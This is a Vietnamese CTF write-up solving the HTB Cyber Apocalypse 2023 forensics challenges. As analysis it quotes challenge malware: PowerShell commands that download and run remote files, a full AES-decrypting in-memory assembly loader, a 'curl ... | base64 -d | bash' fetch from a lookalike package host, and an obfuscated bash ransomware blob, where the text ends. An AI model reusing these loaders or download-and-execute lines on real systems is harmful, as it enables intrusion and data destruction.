# Write up HTB Cyber Apocalypse 2023 - The Cursed Mission #


## Forensics ##

![](https://i.imgur.com/Gim5tQk.png)


Với những bài "Very Easy" thì mình chỉ đi lướt qua vì nó cũng không có nhiều thứ để làm.

### Plaintext Tleasure ###

![](https://i.imgur.com/57G2nr7.png)

Ctrl F, Packet Details -> Username

![](https://i.imgur.com/shMP5S9.png)

``Flag: HTB{th3s3_4l13ns_st1ll_us3_HTTP}``

### Alien Cradle ###

![](https://i.imgur.com/yg17GdP.png)

Mở file .ps1 lên, ta dễ dàng thấy flag

![](https://i.imgur.com/WhKGMxp.png)

``Flag: HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}``

### Extraterrestrial Persistence ###

![](https://i.imgur.com/HrW94Ob.png)

Mở .sh file lên

![](https://i.imgur.com/mzrh2Kq.png)

Decode đoạn string dài ngoằng đấy

![](https://i.imgur.com/O5mt8p3.png)

``Flag: HTB{th3s3_4l13nS_4r3_s00000_b4s1c}``

### Roten ###

![](https://i.imgur.com/TUKe4AK.png)

Sau khi đọc decription thì mình chú ý đến đoạn này ``They suspect that some kind of shell has been uploaded``, vậy là bài này sẽ liên quan tới shell và được uploaded thông qua HTTP.

Mình mở export object HTTP lên và bị choáng ngợp nhè nhẹ bởi số lượng file.

![](https://i.imgur.com/diYRR8x.png)

Để tiện phân tích file bên trong thì mình dùng NetworkMiner (ưu điểm là nó sẽ dump file ra sẵn cho mình và khi mình close thì sẽ xoá).

Có kha khá file nhưng mà chả có gì đặc biệt nên để tránh dài dòng thì mình sẽ không đề cập ở đây.

![](https://i.imgur.com/PnFLIzV.png)

Quay lại Wireshark, mình có để ý đến mấy packet có phương thức GET này nên dùng Tshark để dump ra.

![](https://i.imgur.com/W3M77Fl.png)

![](https://i.imgur.com/YRA7sl6.png)

Xem 1 hồi thì mình để ý đoạn này thì thấy phương thức ``GET `` nhận 1 file tên là ``galacticmap.php`` từ đường dẫn ``dir=%2Fvar%2Fwww%2Fhtml%2Fuploads``.

![](https://i.imgur.com/K4mi3Pn.png)

Thế là mình tìm cái file này và phân tích nó.

Mở lên thì mình nhận ra đây là PHP Shell.

![](https://i.imgur.com/iuD5lDs.png)

Okay, hãy phân tích qua đoạn code:

Biến ``$iyzQ5h8qf6`` được khởi tạo với chuỗi trống. Dấu ".=" dùng để nối chuỗi với chuỗi đã tồn tại, tức là nó sẽ nối tất cả chuỗi của biến ``$iyzQ5h8qf6`` thành 1 chuỗi dài.

![](https://i.imgur.com/oCbT30o.png)

Biến ``$pPziZoJiMpcu`` có giá trị là 82, biến ``$liGBOKxsOGMz = array()`` được khởi tạo là mảng.

![](https://i.imgur.com/KHxe2KI.png)

Chạy vòng lặp từng 0 đến 82, đặt mỗi giá trị bên trong mảng ``$liGBOKxsOGMz[]`` là "", sau đó chạy vòng lặp lồng nhau để thêm chuỗi vào trong từng giá trị trong mảng. Cuối cùng là nối các phần tử trong mảng và xoá khoảng trắng, tab,... rồi gán vào biến ``$bhrTeZXazQ``

![](https://i.imgur.com/kA2vR7r.png)

Sau đó chạy lệnh ``eval( $bhrTeZXazQ ); `` để thực thi ``$bhrTeZXazQ``

Mình chỉ cần đổi eval thành echo rồi cho in ra chương trình thực thi là ra flag.

![](https://i.imgur.com/JKZF1uF.png)

Thực ra lúc đầu mình cũng không phân tích nhiều vậy đâu, đọc sơ qua hiểu code rồi mình google lệnh in ra màn hình là ``echo`` thì thay cho eval là ra. Này viết wu nên phân tích kỹ tí thôi :))).

``Flag: HTB{W0w_ROt_A_DaY}``

### Packet Cyclone ###

![](https://i.imgur.com/Cu34nfd.png)

Bài này thuộc dạng trả lời câu hỏi, trả lời đúng hết thì được flag (mình khá thích cái này vì mình thường biết sẽ làm gì khi gặp câu hỏi :v, còn không phải guess rồi mò nếu gặp phải bài có đề không tường minh nữa)

![](https://i.imgur.com/VGh7r0q.png)

Bài cho mình folder Logs và Sigma-rules, đồng thời đề bài gợi ý mình dùng tool "chainsaw" nên mình đã tìm hiểu cách sử dụng tool này. Về cách cài đặt hay cách dùng gì đấy bạn có thể tham khảo ở link dưới.

https://github.com/WithSecureLabs/chainsaw

Đây là giao diện sau khi mình chạy tool:

![](https://i.imgur.com/P7ob0Pp.png)

Okay, trả lời câu hỏi nào:

![](https://i.imgur.com/53kU7ci.png)

``Flag: HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}`` 

### Artifacts of Dangerous Sightings ###

![](https://i.imgur.com/31FGtBq.png)

Bài này mình sẽ phân tích file trên ổ đĩa ảo (vhdx).

Sau khi đọc decription thì mình chú ý tới dòng này ``her heart races as she notices the Windows Event Viewer tab open on the Security log.``

Mình mở Security Logs xem có gì "lạ" hay không.

Mình vào ``C\Windows\System32\winevt\logs`` mở ``Security.evtx`` lên, sau một hồi tìm kiếm thì mình thấy 1 log đáng nghi. 

``"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass - < C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1``  ở đây powershell dùng parameter ``-ep bypass ``, chạy 1 file tên là ``hidden.ps1`` nằm ở     ``Windows\Tasks
``
```
Trong Powershell, "-ep bypass" là một tùy chọn thực thi được sử dụng để bỏ qua cơ chế bảo mật "Execution Policy" của PowerShell. Execution Policy là một tính năng bảo mật trong PowerShell được sử dụng để kiểm soát khả năng thực thi các script PowerShell trên một hệ thống. Tuy nhiên, nếu "Execution Policy" đã được đặt để giới hạn các script PowerShell chỉ chạy từ nguồn tin cậy hoặc được ký số bởi một chứng chỉ số, việc thực thi các script bên ngoài sẽ bị hạn chế.

Với tùy chọn "-ep bypass", PowerShell sẽ bỏ qua cơ chế bảo mật "Execution Policy" và cho phép thực thi các script PowerShell bất kể nguồn gốc của chúng. Điều này thường được sử dụng khi người dùng muốn thực thi một script mà không muốn thực hiện các bước phức tạp để cấu hình "Execution Policy" hoặc khi script không phải từ nguồn tin cậy nhưng vẫn cần được thực thi.

Lưu ý rằng sử dụng tùy chọn này có thể mở ra các lỗ hổng bảo mật và tăng nguy cơ bị tấn công bởi các script độc hại hoặc phần mềm độc hại.
```

![](https://i.imgur.com/wb2zCzw.png)

Mình vào thẳng trong ổ đĩa ảo và vào thư mục đấy nhưng mà không thấy cái gì.

![](https://i.imgur.com/FSuyTm7.png)

Sau đó mình dùng FTK mở ổ đĩa này lên.

![](https://i.imgur.com/L3khPDO.png)

Mình mở file ``hidden.ps1`` lên bằng ISE thì thấy nó có lệnh ``-WindowStyle hiddeN -ExecuTionPolicy ByPasS`` để ẩn cửa sổ và bypass policy. Theo sau là lệnh powershell ẩn bị enc.

![](https://i.imgur.com/1de0TGc.png)

Mình dùng tool https://github.com/Malandrone/PowerDecode để decode powershell.

Bùm

![](https://i.imgur.com/CtVPsOy.png)

``Flag: HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}``


### Relic Maps ###

![](https://i.imgur.com/MNQbiDx.png)

Với bài này thì mình sẽ phải thay link ``http://relicmaps.htb:/relicmaps.one`` bằng địa chỉ ip trong docker và tải về file ``relicmaps.one``

File có đuôi là ``one`` là file One Notes.

Vì lúc đầu máy báo file này virus nên mình ném vào sanbox ``any.run`` để xem cách nó hoạt động. 

Khái quát sơ về cách hoạt động của file này.

Nếu ta chỉ mở nó bằng One Notes và không thực hiện thêm bất cứ điều gì thì nó sẽ không thực hiện bất kỳ lệnh nào.

![](https://i.imgur.com/WdWrNOq.png)

 Nó chỉ chạy các script độc ẩn bên trong khi nhấn vào "Click to view document".
 
 ![](https://i.imgur.com/jvjmmdI.png)
 
Ở ``process 2836`` nó chạy lệnh ``cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -OutFile $env:tmp\tsmap.one; Start-Process -Filepath $env:tmp\tsmap.one`` và mở Powershell ở ``process 2588`` để chạy lệnh ``powershell  Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -OutFile $env:tmp\tsmap.one; Start-Process -Filepath $env:tmp\tsmap.one``, mục tiêu là tải về file ``topsecret-maps.one`` và đặt tại ``tmp``.
 
Tiếp theo ``process 1272`` chạy lệnh ``cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat`` và mở Powershell ở ``process 3200`` thực hiện lệnh ``powershell  Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat``, mục tiêu là thực hiện tải về file ``window.bat`` và đặt tại ``tmp`` với tên là ``system32.bat``

Okay, vậy mình sẽ tải về file window.bat về để phân tích. Nếu gõ nguyên cái địa chỉ đấy vào thì sẽ không tải được, vì thế mình thay nó bằng ip docker 
![](https://i.imgur.com/wncfKIr.png)

Hoặc cũng có thể tải về bằng cách dùng PowerShell ISE

Vào PowerShell ISE và nhập lệnh ``powershell  Invoke-WebRequest -Uri http://167.99.86.8:31749/get/DdAbds/window.bat -OutFile 'locationyouwanttodownload'\window.bat`` thì chương trình sẽ tự tải xuống.

Khi mình dùng cách gõ trên thanh địa chỉ thì nó sẽ như thế này

![](https://i.imgur.com/GJg1apt.png)

Khi mình dùng cách là dùng ISE thì chương trình sẽ tự tải về đường dẫn mà mình chọn luôn.

![](https://i.imgur.com/3pL7kR5.png)

Mở file bat lên thì chỉ thấy nó chạy 1 hộp thoại CMD trống rồi tự động tắt.

![](https://i.imgur.com/lZZcqSo.png)

Sau đó nó tạo ra 1 file tên là ``window.bat.exe``

![](https://i.imgur.com/3hAIUG6.png)

Mình edit file bat, sửa echo off thành echo on. Bạt lại lên thì thấy nó chạy 1 đống lệnh 

![](https://i.imgur.com/Bqw2EHy.png)
![](https://i.imgur.com/SUFy0OV.png)

Mình mở edit file bat lên (vì nó dài vãi lồng nên mình sẽ không chụp hay paste đầy đủ đoạn code lên đây mà chỉ phân tích). File batch chứa mấy cái biến trông có vẻ vô nghĩa nhưng khi nó ghép với nhau thì lại thành mã thực thi, đây cũng là cách obfuscate ta thường thấy ở shell.

![](https://i.imgur.com/tLDqwnK.png)

Ở đây mình thấy có lệnh cls, tức là sau khi set các biến kia xong thì chương trình sẽ tự động clear console

![](https://i.imgur.com/YnqSgf9.png)

Mình sẽ xoá lệnh cls và thêm lệnh Pause để xem chương trình nó sẽ in ra cái gì 

![](https://i.imgur.com/el0r9VE.png)

Batch file sau khi set các biến thì ghép nó lại rồi thực thi 1 lệnh tạo 1 file tên là ``window.bat.exe`` 

![](https://i.imgur.com/G2DBfqF.png)

Lệnh tiếp theo nó sẽ ``cd`` tới đường dẫn chứa file window.bat.exe

![](https://i.imgur.com/hznSca5.png)

Tiếp theo nó chạy script trong file ``window.bat.exe``, console chỉ hiện thoáng qua script này rồi tắt. Script này sẽ chạy ẩn mà không hiện cửa sổ, bypass policy, và thực hiện command.

![](https://i.imgur.com/nuWiqhx.png)

Để tiện phân tích thì mình đã xoá bớt các lệnh đầu của script đấy bằng cách xoá bớt một vài biến trong đoạn này. Rồi sau đấy copy đoạn code đấy vào ISE để phân tích.

![](https://i.imgur.com/YfTasyC.png)

![](https://i.imgur.com/10ZYwCc.png)

Giải thích tổng quát copy từ chatGPT =)))

![](https://i.imgur.com/T7tt1dt.png)

```powershell=
$eIfqq = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\kietbui\Desktop\window.bat').Split([Environment]::NewLine);
foreach ($YiLGW in $eIfqq) { if ($YiLGW.StartsWith(':: ')) {  
$VuGcO = $YiLGW.Substring(3); 
break;
 };
  };
$uZOcm = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($VuGcO);
$BacUA = New-Object System.Security.Cryptography.AesManaged;
$BacUA.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$BacUA.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$BacUA.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=');
$BacUA.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('2hn/J717js1MwdbbqMn7Lw==');
$Nlgap = $BacUA.CreateDecryptor();$uZOcm = $Nlgap.TransformFinalBlock($uZOcm, 0, $uZOcm.Length);
$Nlgap.Dispose();$BacUA.Dispose();
$mNKMr = New-Object System.IO.MemoryStream(, $uZOcm);$bTMLk = New-Object System.IO.MemoryStream;
$NVPbn = New-Object System.IO.Compression.GZipStream($mNKMr, [IO.Compression.CompressionMode]::Decompress);
$NVPbn.CopyTo($bTMLk);
$NVPbn.Dispose();$mNKMr.Dispose();$bTMLk.Dispose();
$uZOcm = $bTMLk.ToArray();
$gDBNO = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($uZOcm);
$PtfdQ = $gDBNO.EntryPoint;
$PtfdQ.Invoke($null, (, [string[]] ('')))
```
Giải thích cụ thể thì: đầu tiên biến ``$eIfqq`` đọc dữ liệu từ file ``window.bat`` rồi tách từng dòng.
Sau đó nó thực hiện vòng lặp ``foreach`` đọc từng dòng trong ``$eIfqq``. Nếu có dòng nào bắt đầu bằng ``:: `` thì nó sẽ lấy substring thứ 3 của dòng đó gán vào biến ``$VuGcO``.

Tiếp theo biến ``$uZOcm`` sẽ nhận giá trị convert base64 từ biến ``$VuGcO``.

Biến ``$BacUA`` được khởi tạo là 1 instance của lớp ``System.Security.Cryptography.AesManaged`` với đầy đủ chức năng của mật mã AES như Mode: CBC, Padding: PKCS7, Key, IV.

Biến ``$Nlgap`` khởi tạo trình giải mã. 

``$uZOcm = $Nlgap.TransformFinalBlock($uZOcm, 0, $uZOcm.Length);`` giải mã dữ liệu đã được mã hóa bằng AES. Phương thức ``TransformFinalBlock()`` được gọi trên đối tượng ``ICryptoTransform`` đã được tạo ra trước đó và truyền vào ba tham số. Tham số đầu tiên là dữ liệu cần giải mã, tham số thứ hai là vị trí bắt đầu giải mã và tham số cuối cùng là độ dài của dữ liệu cần giải mã. Kết quả của phương thức này là dữ liệu được giải mã và được gán cho biến ``$uZOcm``. 

``$Nlgap.Dispose();$BacUA.Dispose();``, chương trình sẽ giải phóng tài nguyên được sử dụng bởi 2 đối tượng này.

Các dòng code sau chương trình sẽ sử dụng chuỗi được giải mã rồi nén lại, sau đó biến đổi thành mảng rồi gán data vào biến ``$uZOcm``. Sau đó cuối cùng thì nó tạo ra 1 file thực thi rồi chạy chương trình.

Sau khi phân tích xong thì mình sửa đoạn code cho nó in ra cái mảng.

![](https://i.imgur.com/O3YLZLR.png)

Rồi mình copy cái mảng lên Cyberchef, convert from Decimal. Thì như bạn đã thấy thì đây là 1 file thực thi.

![](https://i.imgur.com/INqjM9R.png)

Mình tải về với định dạng txt và mở lên thấy flag

![](https://i.imgur.com/TWlsC9b.png)

Hoặc tải về dưới dạng exe rồi dùng dotPeek decompile cũng được

![](https://i.imgur.com/O5HjVQz.png)

``Flag: HTB{0neN0Te?_iT'5_4_tr4P!}``

### Bashic Ransomware ###

![](https://i.imgur.com/QduFcyp.png)

Bài này cho ta 1 file memory dump, 1 file pcap, symbol của linux và file flag.txt bị mã hoá đuôi là ``.a59ap``

![](https://i.imgur.com/iULenmV.png)

Mình ném symbol vào thư mục symbol của volatility3.

Sau đó mở file memory dump với lệnh:
``py vol.py -f 'forensics.mem' linux.bash``

Trong bash history, mình thấy lệnh ``curl`` nhận file rồi giải mã nó bằng base64 xong sau đó thực thi.

```command
Volatility 3 Framework 2.4.1
Progress:  100.00               Stacking attempts finished
PID     Process CommandTime     Command

440     bash    2023-03-03 20:51:15.000000      id
440     bash    2023-03-03 20:51:16.000000      ps aux
440     bash    2023-03-03 20:51:19.000000      ls
440     bash    2023-03-03 20:51:20.000000      uname -a
440     bash    2023-03-03 20:51:27.000000      curl http://files.pypi-install.com/packages/Kxr43fMD9t.manifest|base64 -d|bash
```

Okay, vậy tiếp theo mình sẽ check network packet tại thời điểm lệnh ``curl`` được thực thi.

![](https://i.imgur.com/X99JOiY.png)

Follow HTTP Stream, mình thấy được nội dung của file ``Kxr43fMD9t.manifest``.

![](https://i.imgur.com/vFHtJH0.png)

Bạn có thể tải về file này thông qua HTTP Object

![](https://i.imgur.com/mJEjKve.png)

Mình copy nội dung của file ``.manifest`` rồi dán lên CyberChef sau đó decode Base64.

Thì nhận được 1 đoạn script có nội dung như sau:

```bash
gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" 'KkmZKkmZJoQMgQXa4VWCJoQZ5gTMUV3MidFRGB1b4VUCJogblhGdgsTXgISKnB3ZgYXLgQmbh1WbvNGKkICI41CIbBiZplgCuVGa0ByOd1FIiIzM0MzM2kjN2cjclB3bsVmdlRmIg0TPgISKp1WYvh2doQiIgs1WgYWaKoQfKQVbuN2NyIHRzI1Vul2RxEGUuBjdJogNvV1Q51mQQdUdHlkTNFTRQlVTNlgCNlle0J2cUNkNG5EWBNzN4hUTGVXCKsHIpgSZ5gTMUV3MidFRGB1b4VkCK0nCG9URJoQLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLtkQCK4SZulGbkFWZkBycphGdgM3cp1GI09mbg8GRg4CdmVGbgMXehRGIuVGdgUmdhhGI19WWg4ycpBSZyVGa0BCLlNnc192YgY2TJkQCK8TZulGbkFWZkBSYgUmclhGdgMXSgoSCJogLzJXZud3bgwWdmRHanlmcgMXdvlmdlJHcgMHdpByb0ByajFmYgMWasVmcgUGa0BibyVHdlJHI0NXdtBSdvlHIsQ3clJHIlhGdgQHc5J3YlRGIvRFIusmcvdHIm9GIm92byBHIzFGIkVGdwlncjVGZgUmYg4WYjBibvlGdjVmZulGIyVGcgUGbpZGIl52Tg4ycu9Wa0NWdyR3culGIyV3bgc3bsx2bmBSdvlHImlGIkVWZ05WYyFWdnBSJwATMgMXagMXZslmZgIXdvlHIn5WayVmdvNWZSlQCJowPzVGbpZGI51GIyVmdvNWZyByb0BydvhEIqkQCK4SeltGIlRXY2lmcwBic19GI0V3boRXa3BSZsJWazN3bw1WagMXagQXagsTblhGdgQHc5J3YlRGIvRHI5F2dgEGIk5WamByb0ByZulWeyRHIl1Wa0Bic19WegUGdzF2dgQ3buBybEBiLkVGdwlncj5WZg4WZlJGIlZXYoBSelhGdgU2c1F2YlJGIlxmYpN3clN2YhBicldmbvxGIv5GIlJXYgMXZslmZgIXdvlHIm9GI0N3bNlQCJowPkVmblBHchhGI0FGaXBiKJkgCFJVQX10TT5UQSBCTBlkUUNVRSJVRUFkUUhVRg4UQgklQgQURUBVWSNkTFBSRSFEITVETJZEISV1TZlQCK0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLJkgCG9URg0CP8ACdhNGIgACIKsHIpgCVt52Y3IjcENjUX5WaHFTYQ5GM2pgC9pAWjdVMNdWdVZjQyUTUoREI0V2cuVXCKkgCl52bklgCpZWCgASCKwGb152L2VGZv4jMgISakICI11CIkVmcoNXCJACIJoAbsVnbvYXZk9iPyAiIpRiIgYTNyMVRBBybnxWYtIXZoBXaj1SLgMWayRXZt1Wez1SLgADIkZWLlNXYyhGczNXYw1SLgAXY5UTYuISakICIv1CIzVWet0CIoNGdhJWLtAyZwdGI8BCWjdVMNdWdVZjQyUTUoREJg8GajVWCJACIJogblhGd70VXgoiIuoiIqASPhASfptHJgs1WgYWaJkgCvRWCKsjchJnLqAien5iKggnYktmLqAiZkBnLqACej9GZuoCIj9GZuoCI0hHduoCIulGIpBicvZWCKkAIgoAcoBnL2NWZy9ycldWYrNWYw9SbvNmLsxWY0Nnbp1SawlHcuMXZslmZv8iOzBHd0hGIiU0bkJHamx2RkFncmZ2ZxBkIgknch5Wai1SY0FGZt0CIUN1TQBCdzVWdxVmct0CIsJXdjlAIgoQYoFmYzgGMQFHRsh1Z4JFI11CIkVmcoNXCKASYoFmYzgGMQFHRsh1Z4JFIl1CIF9GZyhmZsdEZxJnZmdWcg8WLgISeltUbvNnbhJlIgIXLgMXZ51SLgg2Y0FmYt0CInB3ZJoQYoFmYzgGMQFHRsh1Z4JFI+ACWjdVMNdWdVZjQyUTUoREJg8GajVWCKA2Jux1JgQWLgIHdgwHI2EDIu1CIkFWZoBCfgcSXdpTb15GbhpzWbdCIv1CIwVmcnBCfg02bk5WYyV3L2VGZvAycn5WayR3cg1DWjdVMNdWdVZjQyUTUoRUCKsHIpgiNvV1Q51mQQdUdHlkTNFTRQlVTNpgC9pAdzVnc0BiI5V2St92cuFmUiASeltWL0lGZl1SLgADIkZWLk5WYt12bj1SLgcGcnBCfgIibclnbcVjIgUWLg8GajVWCKQncvBXbp1SLgcGcnBCfgUGZvNWZk1SLgQjNlNXYiBCfgoGZPl3MLdzb0UmV5pGb0RCIvh2YllgCi0TPRxEdwMFT0NHMRBFerF1ZrZlUMJUeRpEerFlVCZUSRRWRVdWUrRlRxMFT0BzUMt0Y6ZVcGhFULV1VZhFewkFWWNjWDRmMTNzb3NWNJZlVWJVVWZDaxsEcO1WZIJ1RXBlQUZldNpWU0YkblNjTIdVNJd1YRJlMT9kSy4kNWRlUysmeM9EZV9kcodlUIRmRWxkVXJ2SKNDZCR2aTFjWtN2SjR0VahmaiVzZxwUUoh0T3BnbaVTUxMFVoBDT2RTRi5EbzQmc4c0V0BHbkdFaYNleOhkUuxWRaVjUtZlUSZUZzJkVUZFZw0UNCp2Y4R2VhRnWXlVdS12QHh2VOFTRGZlS0VVTytWVaRHdyMFMKh1VMJFWU5EaE9EdaFTUhlTRUNnTF1Eao1WYws2MidFZHplc0VlTzc2Vhh3cTVWeR52VxYlRV9mS6Z1aGdkYMB3dLVFbwM2dNJjYDRGVjFXNws0VKBDTxIkVhhkRFNVNzNlTzxmajdlWqNla0NlW1c2RiBnWyEWS5MUVwQ2ahhFbXVVawhVZL5ESlNnWXpFb4BDTVRmeLt0Zwolaxc1URJkai9GZEJ2dFVVYzEERXRjTX50bCxWUyUFMkZEdpN1dv52V0p0RhtEZGJGMZ5mWopFST9UOtVFRSpXW2Q3RjxmU6VFc4tWW1UlaOBDZsNUY0NEZ1cmRTdHZqRlcJVVVZxWMUdnSzQ1d3JjYvhGMWZVOVNmWkNTYMhWVUxUMtVFcoREZF5kMLpFdHJVRKRkW2tWbOFlUUFlcFxmU2NWMiZnRz0UdwFlTLRmbU9WOTVVNSRUZzAnMTpkTVJmTONjYI5kbilnWwQldopGVxJleUhkQ6JFcoZFV1c3VN5mVFdld0AzYLBnVhl3aFFWNwc1UGR3RiNTRtJGUWZUVL1UVXBDbXVmVwZVWKZlekZkWrNGW1U0V4pEWOJTUVVGcSdUYLh2aahUO5R2VoV1UthWbadnUwIVcWd1YRVzaUlkVU9kTShVUzYUVPJEcGJmWWFzUxM2aD9kTH1kdFFTYu5UVRNDZzIFRONDT4V0RVRnRrJlW4d1VWRXVOhUNwk1d4M1UDZEMRVjTUNlVw12UPFzahxGZsJlRWVVYHR2VR5mTrFlbKtWU5NWVVBHcnFlQGZVUTZUVVVlVIF2MGpnU1oURShlQW9Ub0NUT4plaOVnTYVGeNpWYMRmMOVFcYJWMNZlWXBnba5mUINVNBpXW6pFWjpnTXpVTO5WZxZkbR1mRXl1SnNjWOBHSP1mUu1EeFRkY4plVhJzZVdlck5WTExGSTBFdtNVNKR0VDxWRjdEcFZFTk1WY5hGWl5mQ6JlWaFzY0oVbl1kQY5UNGRUTEVzVPhGcwImexs2Q1cmMMNlTrN2MGVlYxMmaS9mV6JWWxcUYwpkRlRDdFFGVwtWYChGMkRnUXNGSshlUzY0RjBHewkFMoVUVFhHMZREZyskdRJjYohnMVpHMFVlN1s2Y29WUR5kWxUFVkhEZ6NGSTpnWtJ2T0dVUHhXRhREcsRlNKpnYJp1MLpnWrNVNwdlYLZUbZBHayY1TOBTWMRXaNBnQuFWYoxWTQ5URShGaqR1cWZVZo5ERltEMHVFdkhVTWVDMVBzZYJlejpHTCJFbXdXWzM2RsNzYqRmRkZ3axIlQONjWzoUVVBlVWJWeztmVE5ERlJUOH1kbsR0T2RDMW9GbUF2T1AzSNxmekNkQqNEbad1UoRmVOZkUuJmcvxmYulTVU1mWIJlSaZ0UuZURadnRXR2TatWTCxWViFHZwEFMFxWYXp0aSRkSVFmMsVFZ6lDMTRDZWlVerZ1VshWMiVnRtR2dwFkTSZlaaVDarZVNJt2YwsmbOpGbVpVUsJTVOZFbV9mQIV1QaZVThplbjZlSEJldZh1VIBnbTpGZF9Uas5WVYRWVlNnRqNFewNjTVlzaXBDcGJFdSVkTLFkRkVUNtZVaodUVzgGVWJjWVJ1cwhVUGBXbjxkSwMmW0tmURlzaahHNXJleOVkYEhWblVzZwQGSapWZxh3VVNjSGVVMORlTwRWMWpnRYNGMwNjYUpUbDRVMtRmdwclTMZUVUZEZzsUWKh1TaZVRNplRV5kcwAjUxQXVkVHZxQWTopXV1kkaaRjUIJ2QkRlWIJFSV5kUx4kcn1mV6JleNpmT6VFSaJTU5pESkJ3bBJGeOZkYV5ERkVjStFmSxATWqJ1MVlFaId1SC5mT6hzURhkTsVGdKpWVyUVMUFDMXNVdCxWVxolVNNUMrRmW4VkWs50ROFlWIVWeZhlYzMmVlFFZ610SZ5mTEhHMWFGbX5UV5c0TxgHMaFTSWpVerdkTsB3ajdEbI1kMOp2U3RGMNFzbYpFdSVFZEhGbZ1kUFRFWWBjUuhHMW5kUrFWesZlWLh3aNZUOH1ERS52QJhWVahlUWlVMadUZ0RWRX9kUwU1V1U1TXpVRhtEcupFdCFjUVVzVTtkRUVWekZUZDRWMZBHZxQFUCNTUGpkRiJHZFFGM0NVZtplRkNVODdlbWdVUVB3dTFzdHJWWsdVT0oURiNlVGZlNatGVrpUVUBzYsFmMjhkTTxGMhZjQE1UY0dlYzh3RhRTWUZlM4V0UYVzaZVFcrlFWkpnUIhnMiJHbtlVNjZUZoZUbUt0aGJ1MOhkV5dWMSBnRUdlcVh0VZlzUkNHctRWN4IDVvp0VTllWupVNnpHTXJlbTlkTrVFbGJjYZp0aURTTsNFN0JzSOxmRNlXVsJGeOZlUyUkbjBDasNUMsdkWyFkaTdnVtp1dB5WTYp1RahnUtlFbOVkU1xWbTdVOVZlSORlYrJVRlpkU65EWOhlTzIEWaZXMHJmcnd0TCh2aWpXQuFVVxs2YRZVRNRkVVJlRwdGVwQmRUVnWEFGeVRlWrZEVlhmVyklRkNDZ1kkbTNjVyoldoREZRxGMhRTVwolSopXU2hGWidlRzEWMOVkV0okMhplWVVlRk5WWoZEMWlkUysESstWYLNGRlVEasRmWCNDZhRmaOFTS6pld0IzY2YlRlhXU6xERCpWWxolVhNlQzEWaCpHZTlzQSNlTwMlQGBjWZxWVVJkVXNlUGVkUKRWbSZEbwQGRsBTYu50aDdFbxolQoBjWS5URUZFZYFVasBDZydGbjVzaxElVk1mVwpkRjJnSH10MKFDTxZVVRpEbrpVcGxGV0Jkek5kWqd1VGZVVKRWMaVkRwMlRkhlUGJleZJEcnNlMRtWWvVzaNlmTY5UNG1WYHRWVZJkRq1UawhlTYxmVlRjUVNVMZxWTUJFWPlXTXR2RxclVrZEbZJkRVJlUWVVU0AzVOFHZU5ESOdlYzU1aZJFbYV1SzVUTYlzahdnSVNmasxWV2RXbRhHOTNmQ1cVW6t2MMVlV6tUYkh0Vrp1VXFFdHRmevZVV4N3VNJTWHVmR5U1YyRmaUJEZERFeNFDVDpkaWBDaqN2Qat2Q4tmVkZXNrFlRoNDVMpkMUtmTuNlQKVVT0MmeTtmRsJlWS1mYNpEWXhXRsFmVxU1VaxWVT5WOD5ESCpnYGpVVSBVNF5ETsV0TUJFVTRzZE9ENVd0Tx82dNBzYU5kcJ5GZ5d3VihXVz0EdCRFZvJFSjZEaXRGcahkV2gmRi1mRwE2dZ1WUwJEWOpmSrNmM4UkT2p1VZ9EZIdVWONDZzIEWS9mRWNGMnRlVth3aNt0bI1EW0l3UrhWRkZXSuRWU41mVHljMMhmWGR1b01WU6h2ROVFZHNVbwJTVL5UbOZVODNmeWVUVHpFWZVjTVFlUsNjWPxGVjBDazYVMNVVZUx2MVlGbsNEeS1WVWhHMWlFeVJmQOhVYtx2VNdXUwQmd0ADTTZ0MjNHZV1EaGJjWzYFRONTT6RmWSh1VUZURa9kSqVlcFhVUpJEWaREbIVmesBTTuZkeZdFbFJGawFlTJh3aXVDbXNlVOxGVwUVVjpXSW10cONDZSx2aUVkT6ZldBRUYyg2VTJTREJFNvZ0YHZlVPtGdH1Uc1IDTVp1aSRDbYdVY0tmWZRGWZVkRw4EMjR1YLl1MOllTFNWNwdkWNlTeNlnTU50VwVUT0kjMLhkTWd1MnpWT6RWMWBlWrZVMFNTU2lEbiJDdH9Uc0lWYEhWRhRTRG5EdGVkTuxmVlBDa6tkMOR1UpZ1aDNDcyE1RkBjY5NHMN1EetJVWaBTVsZURPdXV6p1MsNjUIZEbR5kWwMWRshVY1JkbW5kRuFWYOpmV2YVVSpEbEJFWSVVUFpEMjZXRUlVUktWUPRWVVRHcnNEdwMFT0BTeTRUOFR1QCN1VGRXRJREbFR1QWZUVnFUMSFlQpRlSkVlUDFzUMRHMTxkI9oGZPl3MLdzb0UmV5pGb0lgC7BSKo0UW6RnYzR1Q2YkTYF0M3gHSNZUdKg2chJ2LulmYvEyI
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
